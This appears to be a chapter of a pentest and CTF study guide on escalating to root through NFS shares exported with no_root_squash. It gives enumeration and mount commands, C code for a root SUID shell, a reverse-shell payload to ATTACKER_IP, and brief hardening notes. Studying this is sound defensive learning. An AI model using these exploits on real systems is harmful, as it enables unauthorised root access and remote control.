# 11 — NFS Misconfiguration (no_root_squash)

## What is NFS?

**NFS (Network File System)** lets a server share directories over the network so clients can mount them as if they were local folders. It's extremely common in internal corporate networks and older infrastructure.

```
Server: exports /opt/share  →  Client: mounts it at /mnt/share  →  files appear local
```

---

## The Vulnerability: no_root_squash

By default, NFS applies **root squashing**: if a client connects as `root` and accesses the share, the server treats that root user as `nobody` (a low-privilege user) — to prevent a client's root from having server-side root power.

```
Normal (root_squash):     client root → treated as 'nobody' on server share
Misconfigured (no_root_squash): client root → treated as REAL root on server share
```

When `no_root_squash` is set on an exported directory, **any client that mounts it as root can create files that are owned by root on the server** — including a SUID binary.

---

## Step 1 — Find NFS Shares

### From the Target (Internal Enumeration)

```bash
cat /etc/exports
```
**Breakdown:**
- `/etc/exports` = NFS server configuration file, lists shared directories and their options
- Example line: `/opt/backups *(rw,no_root_squash)`
  - `/opt/backups` = directory being shared
  - `*` = any client IP can connect (very permissive)
  - `rw` = read-write access
  - `no_root_squash` = **the vulnerability** — client root keeps root privileges

### From an Attacker Machine (External Enumeration)

```bash
showmount -e TARGET_IP
```
**Breakdown:**
- `showmount` = NFS client utility to query exported shares
- `-e` = show the export list of the given server
- Output example:
```
Export list for TARGET_IP:
/opt/backups *
/srv/nfs     192.168.1.0/24
```

```bash
nmap -p 111,2049 --script nfs-showmount TARGET_IP
```
**Breakdown:**
- `-p 111,2049` = portmapper (111) and NFS (2049) ports
- `--script nfs-showmount` = Nmap NSE script that lists exports, similar to `showmount`

---

## Step 2 — Confirm no_root_squash

You need read access to `/etc/exports` on the target, or you can test it directly by attempting the exploit (if it fails, root was squashed).

```bash
cat /etc/exports | grep no_root_squash
```

---

## Step 3 — Mount the Share (From Attacker Machine)

```bash
mkdir /tmp/nfs_mount
mount -o rw,vers=3 TARGET_IP:/opt/backups /tmp/nfs_mount
```
**Breakdown:**

| Part | Meaning |
|------|---------|
| `mount` | Mount a filesystem |
| `-o rw,vers=3` | Options: read-write, force NFS version 3 (version 3 handles UID/GID mapping the way we need; v4 can behave differently) |
| `TARGET_IP:/opt/backups` | Remote share being mounted |
| `/tmp/nfs_mount` | Local mount point |

```bash
ls -la /tmp/nfs_mount
```
Check ownership of existing files — if owned by `root` and you (as non-root on your own attacker box) can still write here, `no_root_squash` is confirmed.

---

## Step 4 — Create a SUID Binary (The Exploit)

On the attacker machine, write a simple C program that spawns a root shell:

```c
// root.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

Compile and set SUID — **do this as root on your attacker machine**, which is allowed because `no_root_squash` means the server will accept the ownership and permission bits exactly as set by a root client:

```bash
gcc /tmp/root.c -o /tmp/nfs_mount/rootshell
chmod +s /tmp/nfs_mount/rootshell
```
**Breakdown:**
- `gcc ... -o /tmp/nfs_mount/rootshell` = compile directly into the mounted share (so the output file lives on the NFS server)
- `chmod +s` = set BOTH SUID and SGID bits
- Because you are root on your **attacker** machine, and the server does not squash root (`no_root_squash`), the binary is created on the server as **owned by root, with SUID set** — exactly as if root had created it locally on the server

```bash
ls -la /tmp/nfs_mount/rootshell
# -rwsr-sr-x 1 root root ... rootshell
```

---

## Step 5 — Execute on the Target

Now go back to your **low-privilege shell on the target machine** (the actual victim):

```bash
/opt/backups/rootshell
```
**Breakdown:**
- Because the file has SUID set and is owned by root, running it from the target side executes it with root privileges — regardless of which unprivileged user runs it
- `-p` flag inside the C program preserves privileges for bash

```bash
id
# uid=0(root) gid=0(root)
```

---

## Alternative Payload: Reverse Shell

Instead of a SUID binary, you can embed a reverse shell directly:

```c
// revshell.c
#include <stdio.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
    return 0;
}
```

```bash
gcc /tmp/revshell.c -o /tmp/nfs_mount/update
chmod +s /tmp/nfs_mount/update
```

Then trigger `/opt/backups/update` from the target (manually, or if it's referenced by a cron job on the target that you can't otherwise control).

---

## Why This Works (Conceptually)

- NFS normally relies on the CLIENT to correctly report UID/GID — the server trusts the client's claims by default
- `root_squash` exists specifically to stop a malicious client's root user from writing root-owned files on the server
- `no_root_squash` disables that single protection, so **any client's root user is treated as server-root** for that share
- Combined with SUID, this becomes trivial privilege escalation because the SUID binary is created with real root ownership

---

## Detection / Hardening Notes (Blue Team)

```bash
# Always use root_squash (the secure default) unless there's a specific reason not to
# In /etc/exports:
/opt/backups  192.168.1.0/24(rw,root_squash)

# Restrict exports to specific IPs/subnets, never '*'
# Disable SUID execution on NFS mounts client-side:
mount -o nosuid TARGET_IP:/share /mnt/share
```

---

## Practice

Common on TryHackMe/HTB boxes themed around "internal network" or "backup server" scenarios. Trigger enumeration whenever `showmount -e` returns any share, especially one marked with a wildcard `*` for allowed hosts.

---

## Quick Checklist

```
[ ] cat /etc/exports (on target, if readable)          → check for no_root_squash
[ ] showmount -e TARGET_IP (from attacker)              → list available shares
[ ] mkdir /tmp/nfs_mount && mount -o rw,vers=3 ...      → mount the share
[ ] write root.c with setuid(0); system("/bin/bash -p")
[ ] gcc root.c -o /tmp/nfs_mount/rootshell              → compile INTO the share
[ ] chmod +s /tmp/nfs_mount/rootshell                   → set SUID as attacker-root
[ ] on target: /opt/backups/rootshell                   → trigger as root
[ ] id                                                   → confirm root
```
